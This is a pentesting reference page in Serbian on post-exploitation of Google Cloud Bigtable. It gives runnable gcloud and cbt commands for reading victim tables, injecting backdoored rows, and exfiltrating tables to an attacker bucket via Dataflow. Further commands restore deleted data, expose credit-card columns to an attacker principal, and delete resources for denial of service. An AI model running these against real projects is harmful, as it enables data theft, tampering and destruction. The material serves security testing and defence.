# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Za više informacija o Bigtable pogledajte:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Instalirajte `cbt` CLI jednom putem Cloud SDK-a kako bi naredbe ispod radile lokalno:
>
> ```bash
> gcloud components install cbt
> ```

### Čitanje redova

**Dozvole:** `bigtable.tables.readRows`

`cbt` dolazi uz Cloud SDK i komunicira sa admin/data APIs bez potrebe za bilo kakvim middleware-om. Usmerite ga na kompromitovani projekat/instancu i pročitajte redove direktno iz tabele. Ograničite skeniranje ako vam treba samo brz pregled.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### Pisanje redova

**Dozvole:** `bigtable.tables.mutateRows`, (trebaće vam `bigtable.tables.readRows` da potvrdite promenu).

Koristite isti alat za upsert proizvoljnih ćelija. Ovo je najbrži način da ubacite backdoor u konfiguracije, postavite web shells ili ubacite zatrovane redove dataseta.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` prihvata sirove bajtove preko sintakse `@/path`, tako da možete poslati kompajlirane payloads ili serijalizovane protobufs tačno onako kako downstream services očekuju.

### Izvezite redove u svoj bucket

**Dozvole:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Moguće je eksfiltrirati sadržaj cele tabele u bucket koji kontroliše napadač pokretanjem Dataflow job-a koji streamuje redove u GCS bucket koji vi kontrolišete.

> [!NOTE]
> Imajte na umu da će vam biti potrebna dozvola `iam.serviceAccounts.actAs` nad nekim SA koji ima dovoljno dozvola za izvođenje eksporta (po defaultu, ukoliko nije drugačije naznačeno, koristiće se podrazumevani compute SA).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Prebacite template na `Cloud_Bigtable_to_GCS_Parquet` ili `Cloud_Bigtable_to_GCS_SequenceFile` ako želite Parquet/SequenceFile izlaze umesto JSON. Dozvole su iste; menja se samo putanja template-a.

### Uvoz redova

**Dozvole:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Moguće je uvesti sadržaj cele tabele iz bucketa koji napadač kontroliše pokretanjem Dataflow job-a koji strimuje redove u GCS bucket koji vi kontrolišete. Za ovo napadač će prvo morati da kreira parquet fajl sa podacima koji treba da budu uvezeni, u očekivanoj šemi. Napadač bi mogao prvo da izveze podatke u parquet formatu prateći prethodnu tehniku sa podešavanjem `Cloud_Bigtable_to_GCS_Parquet` i doda nove unose u preuzeti parquet fajl

> [!NOTE]
> Imajte na umu da će vam trebati dozvola `iam.serviceAccounts.actAs` nad nekim SA koji ima dovoljno dozvola da izvrši izvoz (po podrazumevanju, ukoliko nije drugačije naznačeno, biće korišćen podrazumevani compute SA).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### Vraćanje rezervnih kopija

**Dozvole:** `bigtable.backups.restore`, `bigtable.tables.create`.

Napadač sa ovim dozvolama može vratiti rezervnu kopiju u novu tabelu pod svojom kontrolom kako bi povratio stare osetljive podatke.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### Vraćanje izbrisanih tabela

**Dozvole:** `bigtable.tables.undelete`

Bigtable podržava soft-deletion sa periodom milosti (obično 7 dana po defaultu). Tokom ovog perioda, napadač koji ima dozvolu `bigtable.tables.undelete` može da obnovi nedavno izbrisanu tabelu i povrati sve njene podatke, potencijalno pristupajući osetljivim informacijama za koje se verovalo da su uništene.

Ovo je posebno korisno za:
- Oporavak podataka iz tabela koje su odbrambeni timovi izbrisali tokom incident response
- Pristup istorijskim podacima koji su namerno obrisani
- Poništavanje slučajnih ili zlonamernih brisanja radi održavanja persistence
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> Operacija undelete radi samo unutar konfigurisane periode zadržavanja (podrazumevano 7 dana). Nakon isteka tog roka, tabela i njeni podaci su trajno obrisani i ne mogu se povratiti ovom metodom.


### Kreirajte ovlašćene prikaze

**Dozvole:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Ovlašćeni prikazi vam omogućavaju da prikažete selektovan podskup tabele. Umesto da poštujete princip najmanjih privilegija, koristite ih da objavite **tačno one skupove osetljivih kolona/redova** za koje vam je stalo i da whitelist-ujete sopstveni principal.

> [!WARNING]
> Stvar je u tome da da biste kreirali ovlašćeni prikaz takođe morate moći da čitate i mutirate redove u osnovnoj tabeli, dakle ne dobijate nikakvu dodatnu dozvolu — zbog toga je ova tehnika uglavnom beskorisna.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
Pošto je pristup ograničen na Authorized View, odbrambeni timovi često previđaju činjenicu da ste upravo kreirali novu krajnju tačku visoke osetljivosti.

### Čitanje Authorized Views

**Dozvole:** `bigtable.authorizedViews.readRows`

Ako imate pristup Authorized View, možete čitati podatke iz njega koristeći Bigtable klijentske biblioteke tako što ćete u zahtevima za čitanje navesti ime Authorized View. Imajte na umu da će Authorized View verovatno ograničiti šta vam je dostupno u tabeli. U nastavku je primer koji koristi Python:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service via Delete Operations

**Dozvole:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Bilo koja od Bigtable dozvola za brisanje može biti iskorišćena za denial of service napade. Napadač sa tim dozvolama može ometati rad brisanjem kritičnih Bigtable resursa:

- **`bigtable.appProfiles.delete`**: Brisanje aplikacionih profila, što prekida klijentske konekcije i konfiguracije rutiranja
- **`bigtable.authorizedViews.delete`**: Uklanjanje autorizovanih prikaza, čime se onemogućavaju legitimni putevi pristupa za aplikacije
- **`bigtable.authorizedViews.deleteTagBinding`**: Uklanjanje veza tagova iz autorizovanih prikaza
- **`bigtable.backups.delete`**: Uništavanje snapshot-ova rezervnih kopija, čime se uklanjaju opcije za oporavak od katastrofa
- **`bigtable.clusters.delete`**: Brisanje čitavih klastera, što dovodi do trenutne nedostupnosti podataka
- **`bigtable.instances.delete`**: Uklanjanje kompletnih Bigtable instanci, brišući sve tabele i konfiguracije
- **`bigtable.tables.delete`**: Brisanje pojedinačnih tabela, što uzrokuje gubitak podataka i padove aplikacija
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> Operacije brisanja su često trenutne i nepovratne. Pre testiranja ovih komandi obavezno napravite rezervne kopije, jer mogu prouzrokovati trajni gubitak podataka i ozbiljne prekide u radu servisa.

{{#include ../../../banners/hacktricks-training.md}}
